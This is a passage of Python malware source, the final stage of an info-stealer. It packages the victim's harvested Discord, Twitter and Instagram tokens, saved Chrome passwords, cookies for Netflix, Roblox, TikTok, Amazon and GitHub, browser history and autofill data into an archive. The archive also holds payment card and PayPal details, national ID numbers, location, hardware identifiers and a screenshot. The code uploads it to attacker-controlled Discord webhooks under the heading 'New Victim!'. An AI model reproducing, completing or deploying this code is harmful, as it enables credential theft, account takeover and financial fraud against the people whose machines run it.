        for _p in main_info[3]:
            if _p[1] == 1:
                payment_card = PrettyTable(padding_width=1)
                payment_card.field_names = [
                    "Brand",
                    "Last 4",
                    "Type",
                    "Expiration",
                    "Billing Address",
                ]
                payment_card.add_row(
                    [_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]]
                )
                pay_l.append(payment_card.get_string())
            elif _p[1] == 2:
                payment_p = PrettyTable(padding_width=1)
                payment_p.field_names = ["Email", "Type", "Billing Address"]
                payment_p.add_row([_p[0], "Paypal", _p[2]])
                pay_l.append(payment_p.get_string())

        files_names = [
            [os.path.join(td, "Discord Tokens.txt"), discord_T],
            [os.path.join(td, "Twitter Tokens.txt"), twitter_T],
            [os.path.join(td, "Instagram Tokens.txt"), insta_T],
            [os.path.join(td, "Chrome Passwords.txt"), chrome_Psw_t],
            [os.path.join(td, "Roblox Cookies.txt"), roblox_T],
            [os.path.join(td, "X Cookies.txt"), x_T],
            [os.path.join(td, "TikTok Cookies.txt"), tiktok_T],
            [os.path.join(td, "Amazon Cookies.txt"), amazon_T],
            [os.path.join(td, "GitHub Cookies.txt"), github_T],
            [os.path.join(td, "Sensitive Information.txt"), sensitive_T],
        ]
        
        for x_, y_ in files_names:
            if (
                (y_ == files_names[0][1] and len(main_info[0]) != 0) or
                (y_ == files_names[1][1] and len(main_info[1]) != 0) or
                (y_ == files_names[2][1] and len(main_info[2]) != 0) or
                (y_ == files_names[3][1] and len(main_info[4]) != 0) or
                (y_ == files_names[4][1] and len(main_info[6]) != 0) or
                (y_ == files_names[5][1] and len(main_info[7]) != 0) or
                (y_ == files_names[6][1] and len(main_info[8]) != 0) or
                (y_ == files_names[7][1] and len(main_info[9]) != 0) or
                (y_ == files_names[8][1] and len(main_info[10]) != 0) or
                (y_ == files_names[9][1] and len(main_info[15]) != 0)
            ):
                with open(x_, "w", encoding="utf-8") as wr:
                    wr.write(y_.get_string())

        all_files = [
            os.path.join(td, "Browser History.txt"),
            os.path.join(td, "Payment Information.txt"),
        ]

        cookie_files = [
            [os.path.join(td, "cookies_netflix.json"), main_info[5]],
            [os.path.join(td, "cookies_roblox.json"), main_info[6]],
            [os.path.join(td, "cookies_tiktok.json"), main_info[8]],
            [os.path.join(td, "cookies_amazon.json"), main_info[9]],
            [os.path.join(td, "cookies_github.json"), main_info[10]],
        ]

        for file_path, data in cookie_files:
            if data:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(dumps(data, indent=4))
                all_files.append(file_path)

        enhanced_files = [
            [os.path.join(td, "all_browser_cookies.json"), main_info[11]],
            [os.path.join(td, "complete_history.json"), main_info[12]],
            [os.path.join(td, "all_browser_passwords.json"), main_info[13]],
            [os.path.join(td, "autofill_data.json"), main_info[14]],
            [os.path.join(td, "sensitive_information.json"), main_info[15]],
        ]

        for file_path, data in enhanced_files:
            if data:
                with open(file_path, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2, default=str)
                all_files.append(file_path)

        with open(all_files[0], "w", encoding="utf-8") as f:
            f.write(find_history())

        if pay_l:
            with open(all_files[1], "w", encoding="utf-8") as f:
                for i in pay_l:
                    f.write(f"{i}\n")

        location_info_file = os.path.join(td, "advanced_location_information.json")
        with open(location_info_file, "w", encoding="utf-8") as f:
            advanced_location_data = {
                "coordinates": {
                    "latitude": p_lst[3][0] if len(p_lst) > 3 and p_lst[3] else 'N/A',
                    "longitude": p_lst[3][1] if len(p_lst) > 3 and p_lst[3] else 'N/A'
                },
                "autonomous_system": p_lst[4] if len(p_lst) > 4 else {}
            }
            json.dump(advanced_location_data, f, indent=2)
        all_files.append(location_info_file)

        with ZipFile(
            os.path.join(td, "data.zip"), mode="w", compression=ZIP_DEFLATED
        ) as zip:
            if get_screenshot.scrn_path and os.path.exists(get_screenshot.scrn_path):
                zip.write(get_screenshot.scrn_path, "screenshot.png")
            
            for files_path in all_files:
                try:
                    if os.path.exists(files_path):
                        zip.write(files_path)
                except FileNotFoundError:
                    pass
            
            for name_f, _ in files_names:
                if os.path.exists(name_f):
                    zip.write(name_f)

        for i, webhook_url in enumerate(webhooks):
            try:
                webhook = DiscordWebhook(
                    url=webhook_url,
                    username="Data Collector",
                    avatar_url="https://i.pinimg.com/736x/a5/66/48/a566482a03fbc1c9ee208267f7640821.jpg",
                )
                embed = DiscordEmbed(title="New Victim!", color="FF0000")
                embed.add_embed_field(
                    name="SYSTEM INFORMATION",
                    value=f":pushpin:`Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`Operating System:` **{platform()}**\n",
                    inline=False,
                )
                
                ip_info_value = f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}**\n:cityscape:`City:` **{p_lst[2]}**\n"
                
                if len(p_lst) > 3 and p_lst[3] and p_lst[3][0] != 'N/A':
                    ip_info_value += f":round_pushpin:`Coordinates:` **{p_lst[3][0]}, {p_lst[3][1]}**\n"
                
                if len(p_lst) > 4 and p_lst[4] and p_lst[4].get('isp') != 'N/A':
                    as_info = p_lst[4]
                    ip_info_value += f":satellite:`ISP:` **{as_info.get('isp', 'N/A')}**\n"
                    if as_info.get('as') != 'N/A':
                        ip_info_value += f":gear:`AS:` **{as_info.get('as', 'N/A')}**\n"
                    if as_info.get('org') != 'N/A':
                        ip_info_value += f":office:`Organization:` **{as_info.get('org', 'N/A')}**\n"
                    if as_info.get('region') != 'N/A':
                        ip_info_value += f":flag_white:`Region:` **{as_info.get('region', 'N/A')}**\n"
                    if as_info.get('timezone') != 'N/A':
                        ip_info_value += f":clock3:`Timezone:` **{as_info.get('timezone', 'N/A')}**\n"
                
                ip_info_value += f":shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n"
                
                embed.add_embed_field(
                    name="LOCATION INFORMATION",
                    value=ip_info_value,
                    inline=False,
                )
                
                embed.add_embed_field(
                    name="PC COMPONENTS",
                    value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n",
                    inline=False,
                )
                
                total_cookies = sum(len(cookies) for cookies in main_info[11].values()) if main_info[11] else 0
                total_history = len(main_info[12]) if main_info[12] else 0
                total_passwords = sum(len(passwords) for passwords in main_info[13].values()) if main_info[13] else 0
                total_sensitive = len(main_info[15]) if main_info[15] else 0
                
                embed.add_embed_field(
                    name="ADVANCED DATA COLLECTION",
                    value=f":cookie:`Total Cookies:` **{total_cookies}**\n"
                          f":bookmark_tabs:`History Entries:` **{total_history}**\n"
                          f":key:`Saved Passwords:` **{total_passwords}**\n"
                          f":warning:`Sensitive Data:` **{total_sensitive}**\n"
                          f":pencil:`Browsers with Data:` **{len(main_info[11]) if main_info[11] else 0}**\n",
                    inline=False,
                )
                
                embed.add_embed_field(
                    name="CAPTURED ACCOUNTS",
                    value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n"
                          f":purple_circle:`Twitter:` **{len(main_info[1])}**\n"
                          f":blue_circle:`Instagram:` **{len(main_info[2])}**\n"
                          f":green_circle:`Netflix:` **{len(main_info[5])}**\n"
                          f":orange_circle:`Roblox:` **{len(main_info[6])}**\n"
                          f":black_circle:`X.com:` **{len(main_info[7])}**\n"
                          f":white_circle:`TikTok:` **{len(main_info[8])}**\n"
                          f":yellow_circle:`Amazon:` **{len(main_info[9])}**\n"
                          f":grey_circle:`GitHub:` **{len(main_info[10])}**\n"
                          f":brown_circle:`Passwords:` **{len(main_info[4])}**\n",
                    inline=False,
                )
                
                cpf_count = sum(1 for item in main_info[15] if item['type'] == 'CPF')
                phone_count = sum(1 for item in main_info[15] if item['type'] == 'Phone Number')
                credit_card_count = sum(1 for item in main_info[15] if item['type'] == 'Credit Card')
                email_count = sum(1 for item in main_info[15] if item['type'] == 'Email')
                
                embed.add_embed_field(
                    name="SENSITIVE INFORMATION FOUND",
                    value=f":id:`CPF Numbers:` **{cpf_count}**\n"
                          f":telephone:`Phone Numbers:` **{phone_count}**\n"
                          f":credit_card:`Credit Cards:` **{credit_card_count}**\n"
                          f":email:`Email Addresses:` **{email_count}**\n",
                    inline=False,
                )
                
                card_e, paypal_e = (
                    ":white_check_mark:" if any(p[1] == 1 for p in main_info[3]) else ":x:",
                    ":white_check_mark:" if any(p[1] == 2 for p in main_info[3]) else ":x:",
                )
                embed.add_embed_field(
                    name="PAYMENT INFORMATION FOUND",
                    value=f":credit_card:`Debit/Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}",
                    inline=False,
                )
                embed.set_footer(text="Developed by codificou | GitHub: Yankkj")
                embed.set_timestamp()
                
                with open(os.path.join(td, "data.zip"), "rb") as f:
                    webhook.add_file(
                        file=f.read(),
                        filename=f"Data-Collector-{os.getenv('UserName')}.zip",
                    )
                
                webhook.add_embed(embed)
                response = webhook.execute()
                
            except Exception as e:
                print(f"Error sending to webhook {i+1}: {e}")

if __name__ == "__main__":
    freeze_support()
    send_webhook()